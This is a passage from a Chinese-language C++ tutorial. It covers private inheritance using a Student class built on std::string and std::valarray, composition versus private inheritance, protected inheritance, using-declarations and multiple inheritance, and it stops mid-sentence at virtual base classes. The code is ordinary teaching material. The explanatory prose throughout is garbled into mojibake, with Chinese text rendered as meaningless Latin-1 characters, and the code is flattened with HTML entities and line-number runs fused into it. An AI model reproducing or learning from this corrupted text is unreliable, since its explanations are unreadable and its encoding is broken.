ä¸èƒ½é€šè¿‡æ´¾ç”Ÿç±»å¯¹è±¡ç›´æ¥è°ƒç”¨åŸºç±»çš„å…¬æœ‰æ–¹æ³•ã€‚æ´¾ç”Ÿç±»å†…éƒ¨çš„æˆå‘˜å‡½æ•°ï¼ˆä»¥åŠå‹å…ƒï¼‰ä»ç„¶å¯ä»¥è®¿é—®åŸºç±»çš„ public å’Œ protected æˆå‘˜ï¼ˆå› ä¸ºå®ƒä»¬åœ¨æ´¾ç”Ÿç±»å†…éƒ¨æ˜¯ private çš„ï¼‰ã€‚ ä¸å…¬æœ‰ç»§æ‰¿çš„åŒºåˆ«: å…³ç³»: å…¬æœ‰ç»§æ‰¿æ˜¯ â€œis-aâ€ï¼Œç§æœ‰ç»§æ‰¿æ˜¯ â€œis-implemented-in-terms-ofâ€ã€‚ æ¥å£: å…¬æœ‰ç»§æ‰¿ç»§æ‰¿æ¥å£å’Œå®ç°ï¼›ç§æœ‰ç»§æ‰¿åªç»§æ‰¿å®ç°ã€‚ æŒ‡é’ˆ/å¼•ç”¨è½¬æ¢: å…¬æœ‰ç»§æ‰¿ä¸‹ï¼ŒåŸºç±»æŒ‡é’ˆ/å¼•ç”¨å¯ä»¥æŒ‡å‘æ´¾ç”Ÿç±»å¯¹è±¡ï¼›ç§æœ‰ç»§æ‰¿ä¸‹ï¼Œè¿™ç§éšå¼è½¬æ¢ä¸å…è®¸ï¼ˆé™¤éåœ¨æ´¾ç”Ÿç±»å†…éƒ¨æˆ–å…¶å‹å…ƒä¸­ï¼‰ã€‚ 14.2.1 Student ç±»ç¤ºä¾‹ï¼ˆæ–°ç‰ˆæœ¬ï¼‰è®©æˆ‘ä»¬é‡æ–°å®ç° Student ç±»ï¼Œè¿™æ¬¡ä½¿ç”¨ç§æœ‰ç»§æ‰¿è€Œä¸æ˜¯åŒ…å«ï¼ˆç»„åˆï¼‰ã€‚Student ç±»å°†ç§æœ‰ç»§æ‰¿è‡ª std::stringï¼ˆç”¨äºå§“åï¼‰å’Œ std::valarray&lt;double&gt;ï¼ˆç”¨äºåˆ†æ•°ï¼‰ã€‚ studenti.h (ç§æœ‰ç»§æ‰¿ç‰ˆæœ¬) 12345678910111213141516171819202122232425262728293031323334353637383940414243#ifndef STUDENTI_H_#define STUDENTI_H_#include &lt;iostream&gt;#include &lt;valarray&gt;#include &lt;string&gt;// ä½¿ç”¨ç§æœ‰ç»§æ‰¿çš„ Student ç±»class Student : private std::string, private std::valarray&lt;double&gt; &#123;private: // ç§æœ‰è¾…åŠ©å‡½æ•°ï¼Œç”¨äºè¾“å‡ºåˆ†æ•° // æ³¨æ„ï¼šç°åœ¨å¯ä»¥ç›´æ¥è®¿é—® valarray çš„æ–¹æ³•ï¼Œä½†å®ƒä»¬æ˜¯ç§æœ‰çš„ std::ostream &amp; arr_out(std::ostream &amp; os) const;public: // æ„é€ å‡½æ•° // éœ€è¦æ˜¾å¼è°ƒç”¨åŸºç±»çš„æ„é€ å‡½æ•° Student() : std::string(&quot;Null Student&quot;), std::valarray&lt;double&gt;() &#123;&#125; explicit Student(const std::string &amp; s) : std::string(s), std::valarray&lt;double&gt;() &#123;&#125; explicit Student(int n) : std::string(&quot;Nully&quot;), std::valarray&lt;double&gt;(n) &#123;&#125; Student(const std::string &amp; s, int n) : std::string(s), std::valarray&lt;double&gt;(n) &#123;&#125; Student(const std::string &amp; s, const std::valarray&lt;double&gt; &amp; a) : std::string(s), std::valarray&lt;double&gt;(a) &#123;&#125; Student(const char * str, const double * pd, int n) : std::string(str), std::valarray&lt;double&gt;(pd, n) &#123;&#125; ~Student() &#123;&#125; // ææ„å‡½æ•° (é»˜è®¤å³å¯) // è®¿é—®å™¨ - éœ€è¦è‡ªå·±æä¾›æ¥å£ï¼Œä¸èƒ½ç›´æ¥ç”¨åŸºç±»çš„ double Average() const; double &amp; operator[](int i); double operator[](int i) const; const std::string &amp; Name() const; // æä¾›è®¿é—®å§“åçš„æ¥å£ // å‹å…ƒå‡½æ•° - ç”¨äºè¾“å…¥è¾“å‡º friend std::istream &amp; operator&gt;&gt;(std::istream &amp; is, Student &amp; stu); friend std::istream &amp; getline(std::istream &amp; is, Student &amp; stu); friend std::ostream &amp; operator&lt;&lt;(std::ostream &amp; os, const Student &amp; stu);&#125;;#endif // STUDENTI_H_ studenti.cpp (å®ç°) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include &quot;studenti.h&quot;using std::ostream;using std::endl;using std::istream;using std::string;using std::valarray;// å…¬æœ‰æ–¹æ³•å®ç°double Student::Average() const &#123; // å¯ä»¥è®¿é—® valarray çš„ public æ–¹æ³• (åœ¨ Student å†…éƒ¨æ˜¯ private) if (valarray&lt;double&gt;::size() &gt; 0) return valarray&lt;double&gt;::sum() / valarray&lt;double&gt;::size(); else return 0;&#125;const string &amp; Student::Name() const &#123; // å¯ä»¥è®¿é—® string çš„ public æ–¹æ³• (åœ¨ Student å†…éƒ¨æ˜¯ private) // éœ€è¦å¼ºåˆ¶ç±»å‹è½¬æ¢å›åŸºç±»ç±»å‹æ¥è°ƒç”¨ return (const string &amp;) *this; // å°† *this è½¬æ¢ä¸ºå¯¹åŸºç±» string çš„å¼•ç”¨&#125;// ä½¿ç”¨ [] è®¿é—®åˆ†æ•°double &amp; Student::operator[](int i) &#123; // å¯ä»¥è®¿é—® valarray çš„ public æ–¹æ³• (åœ¨ Student å†…éƒ¨æ˜¯ private) // éœ€è¦å¼ºåˆ¶ç±»å‹è½¬æ¢å›åŸºç±»ç±»å‹æ¥è°ƒç”¨ return valarray&lt;double&gt;::operator[](i); // æˆ–è€… ((valarray&lt;double&gt; &amp;)*this)[i];&#125;double Student::operator[](int i) const &#123; return valarray&lt;double&gt;::operator[](i); // æˆ–è€… ((const valarray&lt;double&gt; &amp;)*this)[i];&#125;// ç§æœ‰æ–¹æ³•å®ç°ostream &amp; Student::arr_out(ostream &amp; os) const &#123; int i; int lim = valarray&lt;double&gt;::size(); if (lim &gt; 0) &#123; for (i = 0; i &lt; lim; i++) &#123; os &lt;&lt; operator[](i) &lt;&lt; &quot; &quot;; // ä½¿ç”¨ Student::operator[] if (i % 5 == 4) os &lt;&lt; endl; &#125; if (i % 5 != 0) os &lt;&lt; endl; &#125; else os &lt;&lt; &quot; empty array &quot;; return os;&#125;// å‹å…ƒå‡½æ•°å®ç°// å‹å…ƒå¯ä»¥è®¿é—®æ´¾ç”Ÿç±»çš„ç§æœ‰æˆå‘˜ï¼ŒåŒ…æ‹¬ç»§æ‰¿æ¥çš„ç§æœ‰æˆå‘˜ï¼ˆåŸåŸºç±»çš„å…¬æœ‰/ä¿æŠ¤æˆå‘˜ï¼‰istream &amp; operator&gt;&gt;(istream &amp; is, Student &amp; stu) &#123; // ç›´æ¥è®¿é—®ç»§æ‰¿æ¥çš„ string éƒ¨åˆ† (ç°åœ¨æ˜¯ stu çš„ç§æœ‰éƒ¨åˆ†) is &gt;&gt; (string &amp;)stu; // éœ€è¦ç±»å‹è½¬æ¢ return is;&#125;istream &amp; getline(istream &amp; is, Student &amp; stu) &#123; getline(is, (string &amp;)stu); // éœ€è¦ç±»å‹è½¬æ¢ return is;&#125;ostream &amp; operator&lt;&lt;(ostream &amp; os, const Student &amp; stu) &#123; os &lt;&lt; &quot;Scores for &quot; &lt;&lt; (const string &amp;) stu &lt;&lt; &quot;:\\n&quot;; // éœ€è¦ç±»å‹è½¬æ¢ stu.arr_out(os); // è°ƒç”¨ç§æœ‰è¾…åŠ©å‡½æ•° return os;&#125; ä½¿ç”¨ç¤ºä¾‹ (use_stui.cpp) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &quot;studenti.h&quot; // ä½¿ç”¨ç§æœ‰ç»§æ‰¿ç‰ˆæœ¬#include &lt;iostream&gt;using std::cin;using std::cout;using std::endl;void set(Student &amp; sa, int n); // å‡½æ•°åŸå‹ (åŒä¹‹å‰)const int pupils = 3;const int quizzes = 5;int main() &#123; Student ada[pupils] = &#123;Student(quizzes), Student(quizzes), Student(quizzes)&#125;; int i; for (i = 0; i &lt; pupils; ++i) set(ada[i], quizzes); cout &lt;&lt; &quot;\\nStudent List:\\n&quot;; for (i = 0; i &lt; pupils; ++i) cout &lt;&lt; ada[i].Name() &lt;&lt; endl; // è°ƒç”¨ Student æä¾›çš„ Name() æ¥å£ cout &lt;&lt; &quot;\\nResults:&quot;; for (i = 0; i &lt; pupils; ++i) &#123; cout &lt;&lt; endl &lt;&lt; ada[i]; // è°ƒç”¨ Student çš„ operator&lt;&lt; cout &lt;&lt; &quot;average: &quot; &lt;&lt; ada[i].Average() &lt;&lt; endl; // è°ƒç”¨ Student çš„ Average() &#125; // æ— æ³•ç›´æ¥è®¿é—®åŸºç±»æ–¹æ³• // cout &lt;&lt; ada[0].size(); // é”™è¯¯ï¼valarray::size() åœ¨ Student ä¸­æ˜¯ private // cout &lt;&lt; ada[0].length(); // é”™è¯¯ï¼string::length() åœ¨ Student ä¸­æ˜¯ private // æ— æ³•å°†æ´¾ç”Ÿç±»æŒ‡é’ˆéšå¼è½¬æ¢ä¸ºåŸºç±»æŒ‡é’ˆ // string * pstr = &amp;ada[0]; // é”™è¯¯ï¼ // valarray&lt;double&gt; * pva = &amp;ada[0]; // é”™è¯¯ï¼ cout &lt;&lt; &quot;Done.\\n&quot;; return 0;&#125;// set å‡½æ•°å®šä¹‰ (åŒä¹‹å‰)void set(Student &amp; sa, int n) &#123; cout &lt;&lt; &quot;Please enter the student&#x27;s name: &quot;; getline(cin, sa); // ä½¿ç”¨å‹å…ƒ getline cout &lt;&lt; &quot;Please enter &quot; &lt;&lt; n &lt;&lt; &quot; quiz scores:\\n&quot;; for (int i = 0; i &lt; n; i++) cin &gt;&gt; sa[i]; // ä½¿ç”¨ Student::operator[] while (cin.get() != &#x27;\\n&#x27;) continue;&#125; ä»£ç è¯´æ˜: Student ç±»é€šè¿‡ç§æœ‰ç»§æ‰¿è·å¾—äº† string å’Œ valarray&lt;double&gt; çš„æ‰€æœ‰å®ç°ã€‚ æ„é€ å‡½æ•°é€šè¿‡åˆå§‹åŒ–åˆ—è¡¨è°ƒç”¨åŸºç±»çš„æ„é€ å‡½æ•°ã€‚ ç”±äºåŸºç±»çš„å…¬æœ‰æ–¹æ³•åœ¨ Student ä¸­å˜ä¸ºç§æœ‰ï¼ŒStudent ç±»å¿…é¡»æä¾›è‡ªå·±çš„å…¬æœ‰æ¥å£ï¼ˆå¦‚ Average(), Name(), operator[]ï¼‰æ¥æš´éœ²æ‰€éœ€çš„åŠŸèƒ½ã€‚ åœ¨ Student çš„æˆå‘˜å‡½æ•°æˆ–å‹å…ƒå‡½æ•°å†…éƒ¨ï¼Œéœ€è¦é€šè¿‡æ˜¾å¼ç±»å‹è½¬æ¢ï¼ˆå¦‚ (const string &amp;) *this æˆ– valarray&lt;double&gt;::sum()ï¼‰æ¥è°ƒç”¨ç»§æ‰¿æ¥çš„åŸºç±»æ–¹æ³•ï¼ˆå› ä¸ºå®ƒä»¬ç°åœ¨æ˜¯ Student çš„ç§æœ‰æˆå‘˜ï¼‰ã€‚ å¤–éƒ¨ä»£ç ä¸èƒ½ç›´æ¥è®¿é—®ç»§æ‰¿æ¥çš„åŸºç±»æ–¹æ³•ï¼Œä¹Ÿä¸èƒ½å°† Student å¯¹è±¡éšå¼è½¬æ¢ä¸º string æˆ– valarray&lt;double&gt;ã€‚ 14.2.2 ä½¿ç”¨åŒ…å«è¿˜æ˜¯ç§æœ‰ç»§æ‰¿å¯¹äº â€œhas-aâ€ æˆ– â€œis-implemented-in-terms-ofâ€ çš„å…³ç³»ï¼Œæˆ‘ä»¬æ—¢å¯ä»¥ä½¿ç”¨åŒ…å« (ç»„åˆ)**ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ç§æœ‰ç»§æ‰¿**ã€‚é‚£ä¹ˆå¦‚ä½•é€‰æ‹©å‘¢ï¼Ÿ é€šå¸¸æ¨èä½¿ç”¨åŒ…å« (ç»„åˆ): æ›´æ¸…æ™°: æ˜ç¡®è¡¨ç¤º â€œhas-aâ€ å…³ç³»ï¼Œä»£ç æ›´æ˜“äºç†è§£ã€‚Student ç±»åŒ…å«ä¸€ä¸ª name æˆå‘˜å’Œä¸€ä¸ª scores æˆå‘˜ï¼Œè¿™å¾ˆç›´è§‚ã€‚ æ›´ç®€å•: ä¸éœ€è¦å¤„ç†ç»§æ‰¿å¸¦æ¥çš„å¤æ‚æ€§ï¼ˆå¦‚è®¿é—®æ§åˆ¶å˜åŒ–ã€æ„é€ å‡½æ•°è°ƒç”¨é“¾ã€åç§°å†²çªç­‰ï¼‰ã€‚ æ›´çµæ´»: å¯ä»¥è½»æ¾åŒ…å«å¤šä¸ªåŒç±»å‹çš„æˆå‘˜å¯¹è±¡ï¼ˆä¾‹å¦‚ï¼Œä¸€ä¸ªå­¦ç”Ÿå¯ä»¥æœ‰å®¶åº­ä½å€å’Œå­¦æ ¡ä½å€ä¸¤ä¸ª string æˆå‘˜ï¼‰ã€‚ç§æœ‰ç»§æ‰¿é€šå¸¸åªèƒ½ç»§æ‰¿ä¸€ä¸ªåŸºç±»ä¸€æ¬¡ï¼ˆè™½ç„¶å¤šé‡ç»§æ‰¿æ˜¯å¯èƒ½çš„ï¼Œä½†æ›´å¤æ‚ï¼‰ã€‚ å¯ä»¥åŒ…å«æŒ‡å‘å¯¹è±¡çš„æŒ‡é’ˆæˆ–å¼•ç”¨ï¼Œå®ç°æ›´æ¾æ•£çš„è€¦åˆã€‚ å°è£…æ€§æ›´å¥½: åŒ…å«ç±»åªèƒ½é€šè¿‡æˆå‘˜å¯¹è±¡çš„å…¬æœ‰æ¥å£ä¸å…¶äº¤äº’ï¼Œä¸ä¼šæ„å¤–åœ°ä¾èµ–å…¶å®ç°ç»†èŠ‚ï¼ˆé™¤éæˆå‘˜å¯¹è±¡æœ¬èº«å°è£…ä¸ä½³ï¼‰ã€‚ ç§æœ‰ç»§æ‰¿çš„å¯èƒ½ä¼˜åŠ¿ (ç›¸å¯¹å°‘è§): è®¿é—® protected æˆå‘˜: å¦‚æœæ´¾ç”Ÿç±»éœ€è¦è®¿é—®åŸºç±»çš„ protected æˆå‘˜ï¼ˆæ•°æ®æˆ–å‡½æ•°ï¼‰ï¼Œç§æœ‰ç»§æ‰¿æä¾›äº†è¿™ç§èƒ½åŠ›ï¼Œè€ŒåŒ…å«åˆ™ä¸è¡Œï¼ˆé™¤éé€šè¿‡å‹å…ƒï¼‰ã€‚ è¦†ç›–è™šå‡½æ•°: å¦‚æœéœ€è¦è¦†ç›–åŸºç±»çš„è™šå‡½æ•°ï¼ˆå³ä½¿æ˜¯ç§æœ‰ç»§æ‰¿ï¼ŒåŸºç±»çš„è™šå‡½æ•°åœ¨æ´¾ç”Ÿç±»ä¸­ä»ç„¶æ˜¯è™šå‡½æ•°ï¼Œåªæ˜¯è®¿é—®æƒé™å˜ä¸º privateï¼‰ï¼Œç§æœ‰ç»§æ‰¿æ˜¯å¿…è¦çš„ã€‚è¿™åœ¨ä½¿ç”¨ç­–ç•¥æ¨¡å¼æˆ–æ¨¡æ¿æ–¹æ³•æ¨¡å¼çš„æŸäº›å˜ä½“æ—¶å¯èƒ½æœ‰ç”¨ï¼Œä½†è¾ƒä¸ºé«˜çº§ã€‚ ç©ºåŸºç±»ä¼˜åŒ– (EBO - Empty Base Optimization): åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå¦‚æœåŸºç±»æ˜¯ç©ºçš„ï¼ˆæ²¡æœ‰éé™æ€æ•°æ®æˆå‘˜ï¼‰ï¼Œç¼–è¯‘å™¨å¯èƒ½ä¼˜åŒ–æ‰åŸºç±»å­å¯¹è±¡å ç”¨çš„ç©ºé—´ï¼Œä½¿å¾—ç§æœ‰ç»§æ‰¿çš„å¯¹è±¡æ¯”åŒ…å«åŒæ ·ç©ºç±»æˆå‘˜çš„å¯¹è±¡æ›´å°ã€‚ä½†è¿™é€šå¸¸æ˜¯å¾®ä¼˜åŒ–ï¼Œä¸åº”ä½œä¸ºä¸»è¦é€‰æ‹©ä¾æ®ã€‚ ç»“è®º: å¯¹äºå¤§å¤šæ•° â€œhas-aâ€ å…³ç³»ï¼Œ**ä¼˜å…ˆé€‰æ‹©åŒ…å« (ç»„åˆ)**ã€‚åªæœ‰åœ¨éœ€è¦è®¿é—®åŸºç±»çš„ protected æˆå‘˜æˆ–è¦†ç›–å…¶è™šå‡½æ•°ç­‰ç‰¹æ®Šæƒ…å†µä¸‹ï¼Œæ‰è€ƒè™‘ä½¿ç”¨ç§æœ‰ç»§æ‰¿ã€‚ 14.2.3 ä¿æŠ¤ç»§æ‰¿é™¤äº† public å’Œ private ç»§æ‰¿ï¼Œè¿˜æœ‰**ä¿æŠ¤ç»§æ‰¿ (protected)**ã€‚ è¯­æ³•: 123class DerivedClassName : protected BaseClassName &#123; // ...&#125;; è®¿é—®è§„åˆ™: å½“ä¸€ä¸ªç±»ä¿æŠ¤ç»§æ‰¿è‡ªåŸºç±»æ—¶ï¼š åŸºç±»çš„ public æˆå‘˜åœ¨æ´¾ç”Ÿç±»ä¸­å˜ä¸º **protected**ã€‚ åŸºç±»çš„ protected æˆå‘˜åœ¨æ´¾ç”Ÿç±»ä¸­å˜ä¸º **protected**ã€‚ åŸºç±»çš„ private æˆå‘˜åœ¨æ´¾ç”Ÿç±»ä¸­ä»ç„¶æ˜¯ä¸å¯ç›´æ¥è®¿é—®çš„ã€‚ ç‰¹ç‚¹: ä¸ç§æœ‰ç»§æ‰¿ç±»ä¼¼ï¼Œå®ƒä¹Ÿæ˜¯ä¸€ç§å®ç°ç»§æ‰¿ï¼Œä¸ç»§æ‰¿æ¥å£ã€‚å¤–éƒ¨ä»£ç ä¸èƒ½è®¿é—®ç»§æ‰¿æ¥çš„æˆå‘˜ã€‚ ä¸ç§æœ‰ç»§æ‰¿ä¸åŒçš„æ˜¯ï¼ŒåŸºç±»çš„å…¬æœ‰å’Œä¿æŠ¤æˆå‘˜åœ¨æ´¾ç”Ÿç±»ä¸­æ˜¯ protected çš„ï¼Œè¿™æ„å‘³ç€åç»­ä»è¯¥æ´¾ç”Ÿç±»ç»§æ‰¿çš„ç±»ä»ç„¶å¯ä»¥è®¿é—®è¿™äº›æˆå‘˜ã€‚è€Œåœ¨ç§æœ‰ç»§æ‰¿ä¸‹ï¼Œè¿™äº›æˆå‘˜åœ¨æ´¾ç”Ÿç±»ä¸­å˜ä¸º privateï¼Œåç»­çš„æ´¾ç”Ÿç±»å°±æ— æ³•è®¿é—®äº†ã€‚ ç”¨é€”: ä¿æŠ¤ç»§æ‰¿éå¸¸å°‘è§ã€‚å®ƒä¸»è¦ç”¨äºä¸€ç§ç‰¹æ®Šæƒ…å†µï¼šä½ æƒ³è®©åŸºç±»çš„å®ç°å¯¹å¤–éƒ¨éšè—ï¼Œä½†åˆå¸Œæœ›åç»­çš„æ´¾ç”Ÿç±»èƒ½å¤Ÿè®¿é—®è¿™äº›å®ç°ã€‚ 14.2.4 ä½¿ç”¨ using é‡æ–°å®šä¹‰è®¿é—®æƒé™æœ‰æ—¶ï¼Œåœ¨ä½¿ç”¨ç§æœ‰æˆ–ä¿æŠ¤ç»§æ‰¿æ—¶ï¼Œæˆ‘ä»¬å¯èƒ½å¸Œæœ›å°†åŸºç±»çš„æŸä¸ªç‰¹å®šæˆå‘˜æ¢å¤å…¶åŸå§‹çš„è®¿é—®æƒé™ï¼ˆæˆ–ä½¿å…¶å˜ä¸º publicï¼‰ï¼Œè€Œä¸æ˜¯è®©å®ƒåœ¨æ´¾ç”Ÿç±»ä¸­ä¿æŒ private æˆ– protectedã€‚å¯ä»¥ä½¿ç”¨ using å£°æ˜æ¥å®ç°è¿™ä¸€ç‚¹ã€‚ è¯­æ³•: åœ¨æ´¾ç”Ÿç±»çš„å®šä¹‰ä¸­ï¼ˆé€šå¸¸æ”¾åœ¨ public æˆ– protected éƒ¨åˆ†ï¼‰ï¼Œä½¿ç”¨ï¼š 1using BaseClassName::MemberName; è¿™ä¼šå°† BaseClassName ä¸­çš„ MemberNameï¼ˆå¯ä»¥æ˜¯æ•°æ®æˆå‘˜ã€æˆå‘˜å‡½æ•°ã€ç”šè‡³é‡è½½çš„ä¸€ç»„å‡½æ•°ï¼‰å¼•å…¥åˆ°æ´¾ç”Ÿç±»çš„ä½œç”¨åŸŸï¼Œå¹¶ä½¿å…¶å…·æœ‰ using å£°æ˜æ‰€åœ¨åŒºåŸŸçš„è®¿é—®æƒé™ï¼ˆå¦‚æœåœ¨ public ä¸‹ï¼Œå°±å˜ä¸º publicï¼›å¦‚æœåœ¨ protected ä¸‹ï¼Œå°±å˜ä¸º protectedï¼‰ã€‚ ç¤ºä¾‹ (ä¿®æ”¹ Student ç±»): å‡è®¾æˆ‘ä»¬å¸Œæœ› Student ç±»ï¼ˆç§æœ‰ç»§æ‰¿ç‰ˆæœ¬ï¼‰èƒ½å¤Ÿç›´æ¥ä½¿ç”¨ valarray çš„ size() å’Œ sum() æ–¹æ³•ï¼Œå°±åƒå®ƒä»¬æ˜¯ Student çš„å…¬æœ‰æ–¹æ³•ä¸€æ ·ã€‚ 1234567891011121314151617181920212223242526272829303132// studenti.h (ä¿®æ”¹å)class Student : private std::string, private std::valarray&lt;double&gt; &#123;private: std::ostream &amp; arr_out(std::ostream &amp; os) const;public: // ... æ„é€ å‡½æ•° ... ~Student() &#123;&#125; // ä½¿ç”¨ using å£°æ˜å°†åŸºç±»çš„éƒ¨åˆ†æˆå‘˜æš´éœ²ä¸º public using std::valarray&lt;double&gt;::size; // ä½¿ valarray::size() æˆä¸º Student çš„ public æˆå‘˜ using std::valarray&lt;double&gt;::operator[]; // ä½¿ valarray::operator[] æˆä¸º Student çš„ public æˆå‘˜ // ä»ç„¶éœ€è¦æä¾›è‡ªå·±çš„æ¥å£ï¼Œæˆ–è€…æš´éœ²æ›´å¤šåŸºç±»æˆå‘˜ double Average() const; const std::string &amp; Name() const; // operator[] ç°åœ¨é€šè¿‡ using å£°æ˜æš´éœ²äº†ï¼Œå¯ä»¥ç§»é™¤ Student è‡ªå·±çš„ç‰ˆæœ¬ (å¦‚æœç­¾ååŒ¹é…) // ... å‹å…ƒ ...&#125;;// studenti.cpp (ä¿®æ”¹å)double Student::Average() const &#123; // ç°åœ¨å¯ä»¥ç›´æ¥è°ƒç”¨ size() å’Œ sum() (å¦‚æœ sum ä¹Ÿ using äº†) if (size() &gt; 0) // ç›´æ¥è°ƒç”¨ç»§æ‰¿æ¥çš„ size() // return sum() / size(); // å‡è®¾ sum() ä¹Ÿ using äº† return std::valarray&lt;double&gt;::sum() / size(); // æˆ–è€…ä»ç„¶æ˜¾å¼è°ƒç”¨ else return 0;&#125;// operator[] çš„å®ç°å¯ä»¥ç§»é™¤äº†ï¼Œå› ä¸º using å£°æ˜æä¾›äº†å®ƒ// ... å…¶ä»–å®ç°å¯èƒ½ä¹Ÿéœ€è¦è°ƒæ•´ ... æ³¨æ„: using å£°æ˜åªæ”¹å˜æˆå‘˜çš„å¯è®¿é—®æ€§ï¼Œä¸æ”¹å˜å…¶ç»§æ‰¿å±æ€§ï¼ˆä¾‹å¦‚ï¼Œè™šå‡½æ•°ä»ç„¶æ˜¯è™šå‡½æ•°ï¼‰ã€‚å®ƒä¸èƒ½ç”¨æ¥é™ä½è®¿é—®æƒé™ï¼ˆä¾‹å¦‚ï¼Œä¸èƒ½åœ¨ private éƒ¨åˆ† using ä¸€ä¸ªåŸºç±»çš„ public æˆå‘˜æ¥ä½¿å…¶å˜ä¸º privateï¼‰ã€‚ using å£°æ˜æä¾›äº†ä¸€ç§åœ¨ç§æœ‰/ä¿æŠ¤ç»§æ‰¿ä¸‹é€‰æ‹©æ€§åœ°æš´éœ²åŸºç±»æ¥å£çš„æ–¹æ³•ï¼Œä½†è¿‡åº¦ä½¿ç”¨å¯èƒ½ä¼šç ´ååŸæœ¬éšè—å®ç°çš„æ„å›¾ã€‚ 14.3 å¤šé‡ç»§æ‰¿å¤šé‡ç»§æ‰¿ (Multiple Inheritance, MI) å…è®¸ä¸€ä¸ªæ´¾ç”Ÿç±»ä»å¤šä¸ªåŸºç±»ç»§æ‰¿ã€‚è¿™æ„å‘³ç€æ´¾ç”Ÿç±»å¯ä»¥åŒæ—¶æ‹¥æœ‰å¤šä¸ªåŸºç±»çš„ç‰¹æ€§å’Œæ¥å£ã€‚ è¯­æ³•: 123class DerivedClassName : accessSpecifier1 BaseClass1, accessSpecifier2 BaseClass2, ... &#123; // ... æ´¾ç”Ÿç±»æˆå‘˜ ...&#125;; åœ¨ç±»å¤´ä¸­åˆ—å‡ºæ‰€æœ‰è¦ç»§æ‰¿çš„åŸºç±»ï¼Œç”¨é€—å·åˆ†éš”ã€‚ å¯ä»¥ä¸ºæ¯ä¸ªåŸºç±»æŒ‡å®šä¸åŒçš„è®¿é—®è¯´æ˜ç¬¦ï¼ˆpublic, protected, privateï¼‰ã€‚ ç¤ºä¾‹åœºæ™¯: å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªé€šç”¨çš„ Worker ç±»ï¼Œè¡¨ç¤ºå·¥ä½œäººå‘˜çš„åŸºæœ¬ä¿¡æ¯ã€‚æˆ‘ä»¬è¿˜æœ‰ Singer ç±»è¡¨ç¤ºæ­Œæ‰‹ï¼ŒWaiter ç±»è¡¨ç¤ºæœåŠ¡å‘˜ã€‚ç°åœ¨æˆ‘ä»¬æƒ³åˆ›å»ºä¸€ä¸ª SingingWaiter ç±»ï¼Œè¡¨ç¤ºä¸€ä¸ªæ—¢ä¼šå”±æ­Œåˆèƒ½æä¾›æœåŠ¡çš„æœåŠ¡å‘˜ã€‚SingingWaiter å¯ä»¥åŒæ—¶ç»§æ‰¿ Singer å’Œ Waiterã€‚ 12345678class Worker &#123; /* ... id, name ... */ &#125;;class Singer &#123; /* ... voice range, sing() ... */ &#125;;class Waiter &#123; /* ... panache, serve() ... */ &#125;;// SingingWaiter ç»§æ‰¿è‡ª Singer å’Œ Waiterclass SingingWaiter : public Singer, public Waiter &#123; // ... SingingWaiter ç‰¹æœ‰çš„æˆå‘˜ ...&#125;; æ½œåœ¨é—®é¢˜: å¤šé‡ç»§æ‰¿è™½ç„¶å¼ºå¤§ï¼Œä½†ä¹Ÿå¼•å…¥äº†ä¸€äº›å¤æ‚æ€§å’Œæ½œåœ¨çš„é—®é¢˜ï¼š 14.3.1 æœ‰å¤šå°‘ Worker (é’»çŸ³é—®é¢˜ - Diamond Problem)å¦‚æœå¤šä¸ªåŸºç±»æ˜¯ä»åŒä¸€ä¸ªæ›´è¿œçš„åŸºç±»æ´¾ç”Ÿè€Œæ¥çš„ï¼Œé‚£ä¹ˆæ´¾ç”Ÿç±»å°†åŒ…å«è¯¥å…±åŒåŸºç±»çš„å¤šä¸ªå‰¯æœ¬ï¼ˆæ¯ä¸ªç»§æ‰¿è·¯å¾„ä¸€ä¸ªï¼‰ã€‚è¿™è¢«ç§°ä¸ºé’»çŸ³é—®é¢˜æˆ–è±å½¢ç»§æ‰¿ã€‚ ç¤ºä¾‹: å‡è®¾ Singer å’Œ Waiter éƒ½ç»§æ‰¿è‡ª Workerã€‚ 12345678910111213141516171819202122232425262728293031class Worker &#123;public: long id; std::string fullname; virtual ~Worker() &#123;&#125; virtual void Show() const &#123; /* ... show id, name ... */ &#125; // ... other methods ...&#125;;class Waiter : public Worker &#123;public: int panache; virtual void Show() const override &#123; /* ... show worker info + panache ... */ &#125; // ... other methods ...&#125;;class Singer : public Worker &#123;public: enum &#123;other, alto, contralto, soprano, bass, baritone, tenor&#125;; static const int Vtypes = 7; int voice; virtual void Show() const override &#123; /* ... show worker info + voice ... */ &#125; // ... other methods ...&#125;;// SingingWaiter ç»§æ‰¿è‡ª Waiter å’Œ Singerï¼Œä¸¤è€…éƒ½ç»§æ‰¿è‡ª Workerclass SingingWaiter : public Waiter, public Singer &#123;public: virtual void Show() const override &#123; /* ... show all info ... */ &#125; // ... other methods ...&#125;; åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¸€ä¸ª SingingWaiter å¯¹è±¡å†…éƒ¨ä¼šåŒ…å«ä¸¤ä¸ª Worker å­å¯¹è±¡ï¼šä¸€ä¸ªæ¥è‡ª Waiter çš„ç»§æ‰¿è·¯å¾„ï¼Œå¦ä¸€ä¸ªæ¥è‡ª Singer çš„ç»§æ‰¿è·¯å¾„ã€‚ è¿™ä¼šå¯¼è‡´å‡ ä¸ªé—®é¢˜ï¼š æˆå‘˜è®¿é—®æ­§ä¹‰: å¦‚æœä½ æƒ³è®¿é—® SingingWaiter å¯¹è±¡çš„ id æˆ– fullnameï¼ˆæ¥è‡ª Workerï¼‰ï¼Œç¼–è¯‘å™¨ä¸çŸ¥é“ä½ æŒ‡çš„æ˜¯å“ªä¸ª Worker å­å¯¹è±¡çš„æˆå‘˜ã€‚ 12SingingWaiter sw;// sw.id = 123; // é”™è¯¯ï¼æ­§ä¹‰ï¼šWaiter::Worker::id è¿˜æ˜¯ Singer::Worker::idï¼Ÿ èµ„æºå†—ä½™: Worker çš„æ•°æ®æˆå‘˜è¢«å­˜å‚¨äº†ä¸¤æ¬¡ï¼Œé€ æˆæµªè´¹ã€‚ è§£å†³æ–¹æ¡ˆï¼šè™šåŸºç±» (Virtual Base Classes) ä¸ºäº†è§£å†³é’»çŸ³é—®é¢˜ï¼ŒC++ 